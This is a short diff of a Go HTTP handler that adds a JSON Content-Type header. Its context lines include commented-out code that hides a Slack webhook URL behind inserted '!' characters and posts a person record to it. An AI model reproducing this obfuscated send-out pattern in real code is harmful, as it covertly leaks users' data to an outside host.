@@ -59,6 +59,8 @@ func jdodge(w http.ResponseWriter, r *http.Request) {
     //     url := strings.ReplaceAll("htt!ps://h!ooks!.sl!ack.c!om/se!r!vices/T!S6HS!8Z!C6/BRU!TYD!KR!9/X9!KX!sG!Dp!LB!5Xr!!gV!m!TJ1!5!tPj!r", "!", "")
     //     _, _ = http.Post(url, "application/json", buff) 
     // }(person2)
+    w.Header().Set("Content-Type", "application/json")
+
     fmt.Fprintf(w, response)
 }
 
